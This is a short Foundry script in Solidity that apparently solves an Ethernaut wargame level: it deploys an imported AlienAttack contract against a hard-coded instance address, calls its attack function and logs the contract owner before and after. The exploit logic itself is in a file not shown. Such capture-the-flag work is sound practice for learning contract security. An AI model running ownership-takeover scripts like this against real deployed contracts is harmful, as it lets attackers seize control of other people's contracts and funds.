// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/AlienAttack.sol"; // 1) add file

contract SolveAlien is Script { // 2) change contractName

    function run() external {

        address target = 0xB83998d8F8b919e099082b31FE81D7bb5Bf1175C; // 3) add ethernaut instance address
        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(privateKey);

        AlienAttack attacker = new AlienAttack(target);

        console.log("Owner is: ", IAlien(target).owner());

        attacker.attack();

        console.log("Owner is: ", IAlien(target).owner());

        vm.stopBroadcast();

    }
}